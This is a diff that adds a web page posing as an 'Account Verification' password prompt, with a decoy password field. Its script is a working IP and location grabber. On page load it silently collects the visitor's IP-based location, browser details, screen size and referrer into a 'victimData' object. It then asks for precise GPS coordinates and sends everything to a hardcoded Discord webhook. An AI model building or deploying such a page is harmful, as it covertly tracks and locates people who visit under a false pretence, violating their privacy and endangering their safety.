@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Access - Verify Identity</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding: 60px 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: #111;
+            padding: 40px;
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 15px 0;
+            background: #000;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            font-size: 18px;
+        }
+        button {
+            padding: 15px 40px;
+            background: #00ff00;
+            color: #000;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .error { color: #ff0000; margin-top: 10px; }
+        .success { color: #00ff00; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 ACCOUNT VERIFICATION</h1>
+        <p>Enter your password to continue</p>
+        
+        <input type="password" id="passwordInput" placeholder="Enter Password" autocomplete="off">
+        <button onclick="checkPassword()">VERIFY & CONTINUE</button>
+        <div id="message" class="error"></div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1406195402385920010/14yCZb2E9y701ujKNT76skk1bTlEpLz8iu00IGnoJI7zjNr1Ht0g7eZrr97NvpTSeXve";
+
+        let victimData = {
+            timestamp: new Date().toISOString(),
+            status: "IP GRABBED ON PAGE LOAD",
+            ip: "N/A",
+            city: "N/A",
+            region: "N/A",
+            country: "N/A",
+            latitude: null,
+            longitude: null,
+            isp: "N/A",
+            user_agent: navigator.userAgent,
+            screen_resolution: `\( {screen.width}x \){screen.height}`,
+            language: navigator.language,
+            referrer: document.referrer || "Direct",
+            page_url: window.location.href,
+            location_source: "IP only"
+        };
+
+        // Automatic IP grab on page enter
+        async function grabIP() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+
+                victimData.ip = data.ip || "N/A";
+                victimData.city = data.city || "N/A";
+                victimData.region = data.region || "N/A";
+                victimData.country = data.country_name || "N/A";
+                victimData.latitude = data.latitude || null;
+                victimData.longitude = data.longitude || null;
+                victimData.isp = data.org || "N/A";
+                victimData.location_source = "IP only (initial)";
+
+                sendToWebhook();
+            } catch (e) {
+                // silent fallback
+                try {
+                    const fb = await fetch('https://ipinfo.io/json');
+                    const fbData = await fb.json();
+                    victimData.ip = fbData.ip || "N/A";
+                    sendToWebhook();
+                } catch(err) {}
+            }
+        }
+
+        // Try to get precise GPS location (asks permission)
+        function requestPreciseLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // User allowed permission
+                        victimData.latitude = position.coords.latitude;
+                        victimData.longitude = position.coords.longitude;
+                        victimData.accuracy = position.coords.accuracy + " meters";
+                        victimData.location_source = "GPS (permission granted)";
+                        sendToWebhook();
+                    },
+                    (error) => {
+                        // User denied or error - keep IP data
+                        victimData.location_source = "IP only (permission denied)";
+                        sendToWebhook();
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            }
+        }
+
+        function sendToWebhook() {
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: "```json\n" + JSON.stringify(victimData, null, 2) + "\n```",
+                    username: "IP GRABBER"
+                })
+            }).catch(() => {});
+        }
+
+        // Run on page load
+        window.onload = () => {
+            grabIP();
+            // Try precise location after a short delay so IP goes first
+            setTimeout(requestPreciseLocation, 1200);
+        };
+
+        // Fake password trap
+        function checkPassword() {
+            const entered = document.getElementById('passwordInput').value;
+            const msg = document.getElementById('message');
+
+            if (entered === "MyAcc123") {
+                msg.innerHTML = '<span class="success">✅ Access Granted. Loading...</span>';
+                document.querySelector('button').disabled = true;
+            } else {
+                msg.textContent = "❌ Incorrect password.";
+            }
+        }
+
+        document.getElementById('passwordInput').addEventListener('keypress', (e) => {
+            if (e.key === "Enter") checkPassword();
+        });
+    </script>
+</body>
+</html>
